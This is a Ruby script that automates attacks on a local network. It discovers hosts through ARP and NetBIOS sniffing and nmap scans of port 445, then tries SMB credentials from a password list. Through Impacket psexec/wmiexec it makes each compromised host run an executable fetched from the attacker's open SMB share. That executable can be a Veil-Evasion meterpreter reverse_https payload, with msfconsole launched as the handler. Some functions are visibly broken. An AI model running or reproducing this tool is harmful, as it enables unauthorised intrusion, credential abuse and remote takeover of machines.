#!/usr/bin/env ruby
# -*- coding: binary -*-
# encoding: utf-8
require 'term/ansicolor'
require 'open3'
require 'packetfu'
require 'socket'
require 'sqlite3'
require 'macaddr'
require 'netaddr'
require 'ipaddr'
require 'time'
require 'timeout'
require 'pp'
require 'nmap/xml'
#Metasploit Modules Dependencies
require 'rubygems'
require 'optparse'

class Color
	extend Term::ANSIColor
end

$passwordList = []
$verbose = false
$executableName = ''

#Paths Setup
$veilPath = "/pentest/Veil-Evasion"

include PacketFu
$hostList = Array.new()
$scanList = Array.new()
$blackList = Array.new()
#$blackList<<'172.16.91.1'

def readPassword(filename)
	f = File.open(filename)
	f.each_line do |line|
	  $passwordList<<line
	end
f.close
end

def generateVeil()
	print Color.green,Color.bold,'[*] Generating executable using Veil-Evasion',Color.clear+"\n"
	cmd = "rm /root/veil-output/compiled/*"
	run_cmd(cmd)
	
	cmd = "python2.7 "+$veilPath+"/Veil-Evasion.py -p python/meterpreter/rev_https -o sce.32 -c LHOST="+local_ip
	if $verbose==true
		puts run_cmd(cmd)
	else
		run_cmd(cmd)
	end
	cmd = "cp /root/veil-output/compiled/notepad.exe /var/smb_share/sce.32.exe"
	if $verbose==true
		puts run_cmd(cmd)
	else
		run_cmd(cmd)
	end
end

def runSMB(ipAddr)
	#preChecks
	for i in $passwordList
		username = i.split(" ")[0]
		password = i.split(" ")[1]		
	end
	cmd = "smbclient -L //"+ipAddr+" -N -U '"+username+"%"+password+"'"
	result = run_cmd(cmd)
	logonFailure = false
	for x in result
		if x.include? "NT_STATUS_LOGON_FAILURE"
			print Color.red,Color.bold,'[!] Incorrect username or password ('+username+'%'+password+'): '+ipAddr,Color.clear,"\n"
			logonFailure=true
		end
	end
	if logonFailure==false
		#Not completed
		cmd = "ps aux | grep msfconsole | grep -v grep | awk '{print $2}'"
		results = run_cmd(cmd)
		msfRunning = false
		if results.length>0
			msfRunning = true
		end

		print Color.red,Color.bold,'[*] Runs Impacket psexec.py or/and wmiexec.py scripts against: '+ipAddr,Color.clear,"\n"
		if $executableName.length>0
			cmd1 = "python2.7 psexec.py "+username+":"+password+"@"+ipAddr+" cmd /c \\\\\\\\"+local_ip.strip+"\\\\\\smb_share\\\\\\"+$executableName
			cmd2 = "python2.7 wmiexec.py "+username+":"+password+"@"+ipAddr+" cmd /c \\\\\\\\"+local_ip.strip+"\\\\\\smb_share\\\\\\"+$executableName
		else
			cmd1 = "python2.7 psexec.py "+username+":"+password+"@"+ipAddr+" cmd /c \\\\\\\\"+local_ip.strip+"\\\\\\smb_share\\\\\\sce.32.exe"
			cmd2 = "python2.7 wmiexec.py "+username+":"+password+"@"+ipAddr+" cmd /c \\\\\\\\"+local_ip.strip+"\\\\\\smb_share\\\\\\sce.32.exe"
		end
		completed=false
		if $verbose==true
			results = run_cmd(cmd1)
			puts results
		else
			results = run_cmd(cmd1)
			for x in results
				if x.include?"finished with ErrorCode: 0" 
					print Color.red,Color.bold,'[*] psexec.py script ran successfully: '+ipAddr,Color.clear,"\n"
					completed=true
				end
				if x.include?"STATUS_LOGON_FAILURE"
					print Color.red,Color.bold,'[!] Incorrect username or password ('+username+'%'+password+'): '+ipAddr,Color.clear,"\n"
					#puts '[!] Incorrect username or password ('+username+'%'+password+'): '+ipAddr
				end
			end
			#timeout_cmd(cmd1,15)
		end
		if completed==false
			if $verbose==true
				results = run_cmd(cmd2)
				puts results
			else	
				results = run_cmd(cmd2)
			end
		end
		#timeout_cmd(cmd2,30)
	end
end	

def run_cmd(cmd)
    stdin, stdout, stderr = Open3.popen3(cmd)
    return stdout.readlines
end

def timeout_cmd(command,timeout)
    cmd_output = []
    begin
        status = Timeout.timeout(timeout) do
            p = IO.popen(command) do |f|
                f.each_line do |g| 
                    cmd_output << g 
                end
            end
        end
	return cmd_output
    rescue Timeout::Error
	#puts "Timeout: "+command
        return cmd_output
    end
end

def mask_2_ciddr(mask)
   return "/" + mask.split(".").map { |e| e.to_i.to_s(2).rjust(8, "0") }.join.count("1").to_s
end

def chunk(string, size)
    return string.scan(/.{1,#{size}}/)
end

def createDatabase()
	filename = 'database.db'
	if !File.exist?(filename)
	  	db = SQLite3::Database.new( 'database.db' )
  		begin
   			db.execute("CREATE TABLE hosts (id INTEGER PRIMARY KEY,macAddr VARCHAR(255), ipAddr VARCHAR(100), nbnsName VARCHAR(100), runScan VARCHAR(1)) ");
		rescue SQLite3::Exception => e 
    		puts "Exception occured"
    		puts e
    	ensure
			db.close
		end
	end
end

def setup(msfLog)
	#Check if /etc/samba/smb.conf is modified
	cmd = "grep smb_share /etc/samba/smb.conf"
	results = run_cmd(cmd)
	if results.length<1
		open('/etc/samba/smb.conf', 'a') do |f|
  			f << "[smb_share]\n"
  			f << "browseable = no\n"
  			f << "path = /var/smb_share\n"
  			f << "guest ok = yes\n"
  			f << "read only = no\n"
		end		
	end
	cmd = "mkdir /var/smb_share"
	run_cmd(cmd)
	cmd = "/etc/init.d/samba restart"
	run_cmd(cmd)

	if $enableVeil==true
		generateVeil()
	else
		#here
		cmd = " cp "+$executableName+" /var/smb_share"
		run_cmd(cmd)
	end

	#File.open("meterpreter1.rc", 'w') { |file| 
	#	if msfLog.length>0
	#		file.write("spool "+msfLog+"\n") 
	#	else
	#		file.write("spool msfconsole.log\n") 
	#	end
	#	file.write("use multi/handler\n") 
	#	file.write("set AutoRunScript multi_console_command -rc autorunCmd.rc\n")
	#	file.write("set payload windows/meterpreter/reverse_https\n") 
	#	file.write("set ExitOnSession false\n")
	#	file.write("set LHOST "+local_ip)
	#	file.write("set LPORT 8443\n")
	#	file.write("exploit -j -z\n")
	#}	
	cmd = "screen -list | grep msfscreen"
	results = run_cmd(cmd)
	if results.length<1
		cmd = "screen -dmS msfscreen"
		run_cmd(cmd)
		cmd = "screen -S msfscreen -X stuff '/bin/bash --login\nrvm use 1.9.3-p484\nmsfconsole -r meterpreter.rc\n'"
		puts cmd
		run_cmd(cmd)
	else
		cmd = "ps aux | grep msfconsole | grep -v grep | awk '{print $2}'"
		results = run_cmd(cmd)
		puts results
		msfRunning = false
		if results.length>0
			msfRunning = true
		else
			cmd = "screen -S msfscreen -X stuff '/bin/bash --login\nrvm use 1.9.3-p484\nmsfconsole -r meterpreter.rc\n'"
			run_cmd(cmd)
			puts "[*] Sleeping for 30 seconds to wait for Metasploit to start"
			sleep(30)
		end

	end
end

def getGateway()
	cmd = "/sbin/ip route | awk '/default/ { print $3 }'"
	gateway = timeout_cmd(cmd,15)[0]
end

def getMacAddress(ipAddr)
	x = PacketFu::ARPPacket.new(:ï¬‚avor => "Windows")
	x.eth_saddr=Mac.addr
	x.eth_daddr="ff:ff:ff:ff:ff:ff"
	x.arp_saddr_ip=local_ip
	x.arp_saddr_mac=Mac.addr 
	x.arp_daddr_ip=ipAddr
	x.arp_daddr_mac="00:00:00:00:00:00"
	x.arp_opcode=1
	x.to_w('eth0') 
end

def runNmap(ipAddr)
	targetIP = ipAddr
	puts "[*] Checking for open 445/tcp port on host "+targetIP
	#print Color.green,Color.bold,'[*] Checking for open 445/tcp port on host '+targetIP,Color.clear+"\n"
 	filename = 'scan_'+ipAddr+'.xml'
	ipAddr = local_ip.split('.').map{ |octet| octet.to_i} 
     	broadcastIP =  ipAddr[0].to_s+'.'+ipAddr[1].to_s+'.'+ipAddr[2].to_s+'.255'
       	cmd = "/sbin/ifconfig eth0 | awk '/Mask:/{ print $4;} '"
	output = IO.popen(cmd)
	netmask = output.readlines
	netmask = (netmask[0]).gsub("Mask:","").to_s
	netmask = netmask[0..(netmask.size-1)].to_s
	cidr = mask_2_ciddr(netmask)	
	ipRange =  ipAddr[0].to_s+'.'+ipAddr[1].to_s+'.'+ipAddr[2].to_s+'.0'
	if not File.exist?(filename)
		cmd = 'nmap -Pn -sT -n -p 445 '+targetIP+' --open -oX '+filename
		timeout=120
		timeout_cmd(cmd,timeout)
		portListTmp=[]
		Nmap::XML.new(filename) do |xml|
 		 	xml.each_host do |host|
    			puts "[#{host.ip}]"
				host.each_port do |port|
					if port.state!='filtered' and port.state!='closed'
						print Color.green,Color.bold,'[*] Open 445/tcp port found on: '+targetIP,Color.clear+"\n"
						#puts "[*] Open 445/tcp port found on: "+targetIP
      					#puts "  #{port.number}/#{port.protocol}\t#{port.state}\t#{port.service}"
						portListTmp<<port.number
					end
				end
    		end
  		end
		return portListTmp
	else
		portListTmp=[]
		Nmap::XML.new(filename) do |xml|
			xml.each_host do |host|
    				#puts "[#{host.ip}]"
				host.each_port do |port|
					if port.state!='filtered' and port.state!='closed'
						print Color.green,Color.bold,'[*] Open 445/tcp port found on: '+targetIP,Color.clear+"\n"
	     				#puts "  #{port.number}/#{port.protocol}\t#{port.state}\t#{port.service}"
						portListTmp<<port.number
					end
    			end
  			end
		end
		return portListTmp
	end
end

def findHosts()
	loop{
	       	ipAddr = local_ip.split('.').map{ |octet| octet.to_i} 
       		broadcastIP =  ipAddr[0].to_s+'.'+ipAddr[1].to_s+'.'+ipAddr[2].to_s+'.255'
        	cmd = "/sbin/ifconfig eth0 | awk '/Mask:/{ print $4;} '"
		output = IO.popen(cmd)
		netmask = output.readlines
		netmask = (netmask[0]).gsub("Mask:","").to_s
		netmask = netmask[0..(netmask.size-1)].to_s
		cidr = mask_2_ciddr(netmask)	
		ipRange =  ipAddr[0].to_s+'.'+ipAddr[1].to_s+'.'+ipAddr[2].to_s+'.0'
   		cidr4 = NetAddr::CIDR.create(ipRange+cidr)
		puts "[*] Finding Hosts: "+ipRange+cidr
		cmd = 'nmap -PR -n -sn '+ipRange+cidr+' -oX arp_scan.xml'
		timeout=15
		timeout_cmd(cmd,timeout)
		#Nmap::XML.new('arp_scan.xml') do |xml|
  		#	xml.each_host do |host|
    		#		puts "[#{host.ip}]"
    		#	end
  		#end
		sleep(60)
	}
end

def runScan()
	$blackList<<getGateway()
	loop{
		if $scanList.length>0
			$scanList.each{|x| 
				$scanList.delete(x)
				found=false
				for y in $blackList
					if y.strip.eql?x.strip
						found=true
					end
				end
				if found==false
				#if not $blackList.include?(x.strip)
				#	puts x.strip.eql?$blackList[0].strip
					portList=runNmap(x)
					if portList.length>0
						#Tasks to run after detecting host in network
						for y in portList
							if y==445
								runSMB(x)
							end
						end
					end
				end
			}
		end
		sleep(5)
	}
end


def updateHostNBNS(nbnsName,ipAddr)
	begin
		db1 = SQLite3::Database.open "database.db"
		stmt1 = db1.prepare "update hosts set nbnsName=? where ipAddr=?"
		stmt1.bind_param 1, nbnsName
		stmt1.bind_param 2, ipAddr
		rs1 = stmt1.execute
	rescue SQLite3::Exception => e 
    		puts "Exception occured"
    		puts e
    	ensure
		stmt1.close if stmt1
    		db1.close if db1
	end
end

def findMac(macAddr)
	rows = ''
	begin
  		macAddr = macAddr.strip()

    	db = SQLite3::Database.open "database.db"
		stmt = db.prepare "SELECT macAddr from hosts WHERE macAddr=?"
		stmt.bind_param 1, macAddr
		rs = stmt.execute
		rows = rs.next
	rescue SQLite3::Exception => e 
    		puts "Exception occured"
    		puts e
    	ensure
		stmt.close if stmt
    		db.close if db
	end
	if not rows.nil?
		if rows.length>0
			return true
		else
			return false
		end
	else
		return false
	end
end
def updateHost(macAddr,ipAddr)
	rows = ''
	begin
  		macAddr = macAddr.strip()
		ipAddr = ipAddr.strip()

    	db = SQLite3::Database.open "database.db"
		stmt = db.prepare "SELECT ipAddr from hosts WHERE macAddr=?"
		stmt.bind_param 1, macAddr
		rs = stmt.execute
		rows = rs.next
	rescue SQLite3::Exception => e 
    		puts "Exception occured"
    		puts e
    	ensure
		stmt.close if stmt
    		db.close if db
	end
	begin
	   	db1 = SQLite3::Database.open "database.db"
		if rows.nil?
			print Color.green,Color.bold,"[*] New Device Found - "+ipAddr+" (Mac: "+macAddr+")",Color.clear,"\n"
			stmt1 = db1.prepare "insert into hosts (macAddr,ipAddr,runScan) VALUES (?,?,0)"
			stmt1.bind_param 1, macAddr
			stmt1.bind_param 2, ipAddr
			rs1 = stmt1.execute
		else
			if rows[0]!=ipAddr
				puts "old: "+rows[0]+" new: "+ipAddr
				puts "[*] Change in IP address (IP: "+ipAddr+") (Mac: "+macAddr+")"
				stmt1 = db1.prepare "update hosts set ipAddr=? where macAddr=?"
				stmt1.bind_param 1, ipAddr
				stmt1.bind_param 2, macAddr
				rs1 = stmt1.execute
			end
		end
	rescue SQLite3::Exception => e 
    		puts "Exception occured"
    		puts e
    	ensure
		stmt1.close if stmt1
    		db1.close if db1
	end
end

def local_ip
  cmd =  'echo `ifconfig eth0 | grep \'inet addr:\'|grep -o -P \'(?<=addr:).*(?=Bcast)\'`'
  output = run_cmd(cmd)
  return output[0]
end

def nmblookup(ipAddr)
  command = "arp"
  macAddr = ''
  p = IO.popen(command) do |f|
  	f.each_line do |g| 
		if g.include? ipAddr 
			macAddr = (g.split(" ").map(&:strip))[2]
		end
       	end
  end

  #Get Mac Address of IP Address
  udp_pkt = PacketFu::UDPPacket.new
  udp_pkt.eth_dst = "\xff\xff\xff\xff\xff\xff"

  #Randomize Source Port
  udp_pkt.udp_src=137
  udp_pkt.udp_dst=137

  udp_pkt.ip_saddr=local_ip
  udp_pkt.ip_daddr=macAddr
  nbns_tranID = "\x80\x0a"
  nbns_flags  = "\x00\x00"
  nbns_questions = "\x00\x01"
  nbns_answers = "\x00\x00"
  nbns_authority = "\x00\x00"
  nbns_additional = "\x00\x00"
  nbns_queriesNbstat = '\x20\x43\x4b\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00'
  nbns_queriesType="\x00\x21"
  nbns_queriesClass="\x00\x01"

  udp_pkt.payload=nbns_tranID+nbns_flags+nbns_questions+nbns_answers+nbns_authority+nbns_additional<<encodedHex<<nbns_quriesNbstat<<nbns_queriesType<<nbns_queriesClass
  udp_pkt.recalc
  #udp_pkt.to_f('/mnt/hgfs/tmp/udp.pcap')
  puts "[*] Sent NBSTAT Query: "+hostName
  udp_pkt.to_w("eth0")
end

def getNetBIOS(ipAddr)
	Socket.do_not_reverse_lookup = false  
	puts Socket.getaddrinfo(ipAddr, nil)[0][2]      
end

def sendNetBIOS(hostName)
  charLookup = { "A"=>"EB", "B"=>"EC", "C"=>"ED", "D"=>"EE", "E"=>"EF", "F"=>"EG", "G"=>"EH", "H" =>"EI", "I" =>"EJ", "J" =>"EK", "K" =>"EL", "L" =>"EM", "M" =>"EN", "N" =>"EO", "O" =>"EP", "P" =>"FA", "Q" =>"FB", "R" =>"FC", "S" =>"FD", "T" =>"FE", "U" =>"FF", "V" =>"FG", "W" =>"FH", "X" =>"FI", "Y" =>"FJ", "Z" =>"FK", "0" =>"DA", "1" =>"DB", "2" =>"DC", "3" =>"DD", "4" =>"DE", "5" =>"DF", "6" =>"DG", "7" =>"DH", "8" =>"DI", "9" =>"DJ", " " =>"CA", "!" =>"CB", "$" =>"CE", "%" =>"CF", "&" =>"CG", "'" =>"CH", "(" =>"CI", ")" =>"CJ", "*" =>"CK", "+" =>"CL", "," =>"CM", "-" =>"CN", "." =>"CO", "=" =>"DN", ":" =>"DK", ";" =>"DL", "@" =>"EA", "^" =>"FO", "_" =>"FP", "{" =>"HL", "}" =>"HN", "~" =>"HO"}
  ipAddr = local_ip.split('.').map{ |octet| octet.to_i} 
  broadcastIP =  ipAddr[0].to_s+'.'+ipAddr[1].to_s+'.'+ipAddr[2].to_s+'.255'
  puts "[*] Interface IP: "+local_ip
  #puts broadcastIP
  udp_pkt = PacketFu::UDPPacket.new
  udp_pkt.eth_dst = "\xff\xff\xff\xff\xff\xff"
  udp_pkt.udp_src=137
  udp_pkt.udp_dst=137

  udp_pkt.ip_saddr=local_ip
  udp_pkt.ip_daddr=broadcastIP
  nbns_tranID = "\x80\x0a"
  nbns_flags  = "\x01\x10"
  nbns_questions = "\x00\x01"
  nbns_answers = "\x00\x00"
  nbns_authority = "\x00\x00"
  nbns_additional = "\x00\x00"
  nbns_queriesType="\x00\x20"
  nbns_queriesClass="\x00\x01"

  encoded = ''
  encodedHex = "\x20"
  hostName.scan(/./).each do |i|
   encoded<<charLookup[i.upcase()]
   c=charLookup[i.upcase()]
   encodedHex<<c
  end
  encodedHex<<"\x43\x41\x43\x41\x41\x41\x00"
  udp_pkt.payload=nbns_tranID+nbns_flags+nbns_questions+nbns_answers+nbns_authority+nbns_additional<<encodedHex<<nbns_queriesType<<nbns_queriesClass
  udp_pkt.recalc
  udp_pkt.to_f('/mnt/hgfs/tmp/udp.pcap')
  puts "[*] Sent Netbios Name Query for: "+hostName
  udp_pkt.to_w("eth0")
end

def sniff(iface)
  puts "[*] Listening to: "+iface
  #puts "[*] Looking for Packets Matching Destination IP: "+dstIP
  charLookup = {"EB"=>"A", "EC"=>"B", "ED"=>"C", "EE"=>"D", "EF"=>"E", "EG"=>"F", "EH"=>"G", "EI"=>"H", "EJ"=>"I", "EK"=>"J", "EL"=>"K", "EM"=>"L", "EN"=>"M", "EO"=>"N", "EP"=>"O", "FA"=>"P", "FB"=>"Q", "FC"=>"R", "FD"=>"S", "FE"=>"T", "FF"=>"U", "FG"=>"V", "FH"=>"W", "FI"=>"X", "FJ"=>"Y", "FK"=>"Z","DA"=>"0", "DB"=>"1", "DC"=>"2", "DD"=>"3", "DE"=>"4", "DF"=>"5", "DG"=>"6", "DH"=>"7", "DI"=>"8", "DJ"=>"9", "CA"=>" ", "CB"=>"!",  "CE"=>"$", "CF"=>"%", "CG"=>"&", "CH"=>"'", "CI"=>"(", "CJ"=>")", "CK"=>"*", "CL"=>"+", "CM"=>",", "CN"=>"-", "CO"=>".", "DN"=>"=", "DK"=>":", "DL"=>";", "EA"=>"@", "FO"=>"^", "FP"=>"_", "HL"=>"{", "HN"=>"}", "HO"=>"~"}

  #Get Broadcast IP Address
  ipAddr = local_ip.split('.').map{ |octet| octet.to_i} 
  broadcastIP =  ipAddr[0].to_s+'.'+ipAddr[1].to_s+'.'+ipAddr[2].to_s+'.255'

  cap = Capture.new(:iface => iface, :start => true)
  cap.stream.each do |p|
    pkt = Packet.parse p
    if pkt.eth_daddr==Mac.addr and pkt.proto.last=='ARP' 
	if pkt.arp_opcode==2
		if !$hostList.include? pkt.arp_saddr_ip
			puts "[!] Found Host: "+pkt.arp_saddr_ip+" (" +pkt.arp_saddr_mac+")"
			
			if findMac(pkt.eth_saddr)==false			
				$hostList<<(pkt.arp_saddr_ip)
				if not $blackList.include? pkt.arp_saddr_ip
					$scanList<<(pkt.arp_saddr_ip).strip
				end
			else
				$hostList<<(pkt.arp_saddr_ip).strip
			end
		end
	end
    end
    #Listens and picks up ARP packets
    if pkt.is_arp?
      if pkt.eth_daddr==Mac.addr
      	 if pkt.arp_opcode==2
		
	    ipAddr = pkt.arp_saddr_ip
	    macAddr = pkt.arp_saddr_mac
	    updateHost(macAddr,ipAddr)

         end
      end
    end
    #Listens to NetBIOS broadcast packets for new hosts
    #if pkt.is_ip?
    if pkt.is_udp?
      next if pkt.ip_saddr == Utils.ifconfig(iface)[:ip_saddr]
      packet_info = [pkt.ip_saddr, pkt.ip_daddr, pkt.size, pkt.proto.last]
      finalStr = ''
      if (pkt.ip_daddr==broadcastIP) and  pkt.proto.last=='UDP' and pkt.udp_sport==137
	     tranID = pkt.hexify(pkt.payload[0..1])
             nbnsq_flags = pkt.hexify(pkt.payload[2..3])
	     nbnsq_flags = nbnsq_flags.gsub(" ","")
	     nbnsq_flags = nbnsq_flags.gsub(".","")
	     nbnsq_flags = nbnsq_flags.gsub("(","")
	     nbnsq_flags = nbnsq_flags.gsub(")","")
	     #puts "Packet found"
             tranID1 = tranID.split(" ")
	     pkt.payload().split("").each do |i|
              	charDict = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
              	if charDict.include? i
              		finalStr += i
              	end
	     end
             nbnsq_list = chunk(finalStr,2)
	     if tranID1[0]=="80" and tranID1[1]=="00"
	        if nbnsq_flags.to_s=="2910"
	    	        decoded = ''
		        process=0
               	 	while process!=1
				for i in nbnsq_list
					if !charLookup[i].nil?
						decoded<<charLookup[i]
					else
						process=1
					end			
				end
			end
			puts "[!] Received NetBIOS Broadcast - (Name: "+decoded+") (IP: "+pkt.ip_saddr+")"
			ipAddr = "%-15s" %packet_info
			hostName = decoded
			updateHostNBNS(hostName,pkt.ip_saddr)
                end

	    end   
	 end
      end

   end
end

options = {}
opt_parser = OptionParser.new do |opt|
  opt.banner = "Usage: opt_parser [OPTIONS]"
  opt.separator  "Options"

  opt.on("-e","--exe FILE","which file do you want the remote host to run") do |executable|
    options[:executable] = executable
  end
  opt.on("-f","--file PASSWORD_FILE","which file do you want to get the credentials from") do |passwordFile|
    options[:passwordFile] = passwordFile
  end
  opt.on("-m","--msf LOG","which file do you want to write metasploit logs to") do |msfLog|
    options[:msfLog] = msfLog
  end
  opt.on("-i","--interface iface","which network interface do you want to listen on") do |iface|
    options[:iface] = iface
  end
  opt.on("-v","--verbose","verbose mode") do
    options[:verbose] = true
  end
  opt.on("-n","--enableVeil","use Veil Evasion to create payload executables") do 
    options[:enableVeil] = true
  end
  opt.on("-h","--help","help") do
    puts opt_parser
  end
end


opt_parser.parse!
if options[:passwordFile]
	if options[:verbose]==true
		$verbose=true
	end
	if options[:enableVeil]
   		$enableVeil=true
   		if not File.exist?($veilPath+"/Veil-Evasion.py")
   			print Color.red,Color.bold,"[!] Please check that $veilPath is setup correct",Color.clear,"\n\n"
   			exit
   		end
   	end
   	if ((options[:enableVeil] or File.exist?(options[:executable]) and File.exist?(options[:passwordFile])))
		$executableName=options[:executable]
		readPassword(options[:passwordFile])
		system('rm -rf database.db')
		sleep(1)
		createDatabase()
		threadList=[]
		if options[:msfLog]
			setup(msfLog=options[:msfLog])
		else
			setup(msfLog="")
		end
		if options[:iface]
			iface=options[:iface]
		else
			iface = "eth0"
		end
		threadList<<Thread.new{sniff(iface)}
		threadList<<Thread.new{findHosts()}
		threadList<<Thread.new{runScan()}
		threadList.each {|x| x.join}
	else
		puts "[!] Please check that both "+options[:executable]+" and "+options[:passwordFile]+" exists\n\n"
		puts opt_parser
	end
end